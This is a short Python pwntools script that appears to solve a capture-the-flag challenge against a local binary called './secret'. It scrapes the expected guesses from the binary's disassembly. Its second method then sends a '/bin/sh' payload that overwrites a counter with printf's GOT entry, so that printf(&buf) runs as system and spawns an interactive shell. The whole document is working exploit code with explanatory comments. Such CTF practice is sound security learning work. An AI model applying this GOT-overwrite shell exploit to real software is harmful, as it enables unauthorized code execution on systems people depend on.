import re
from pwn import *
# context.log_level = "DEBUG"
# objdump -S ./secret -m i386:x86-64:intel -j .text > secret.asm
file=open("secret.asm",'r')
data=file.readlines()
data_list = []
for i in range(len(data)):
    if re.search('cmp    eax,',data[i]):
        data_list.append(int(data[i][-7:],16))
log.success("data got!%d"%len(data_list))

p = process('./secret')

def way1():
	p.send('AAA')	# name

	for i in data_list:
		p.send(str(i))
		sleep(0.1)
	p.interactive()

def way2():
	# .got.plt:000000000046D038 off_46D038 dq offset loc_401076         ; DATA XREF: _system
	# .got.plt:000000000046D040 off_46D040 dq offset loc_401086         ; DATA XREF: _printf
	payload = '/bin/sh\x00'.ljust(0x10,'a')
	payload += p32(ELF('./secret',checksec=False).got['printf'])
	# cover the 0x46D090(record times which was set to 10000) to printf@got,
	# when we guess the number 16 times and all is right,
	# the fake value(printf@got) will point to system@got,
	# meanwhile, we guess a wrong number to make program call sub_401301,
	# in this function, it will call printf(&buf),
	# because we rewrite printf@got to system@got,
	# it will execute system(&buf) actually
	p.send(payload)
	for i in range(0xf):
		p.send(str(data_list[i]))
		sleep(0.1)
	p.interactive()

# way1()
way2()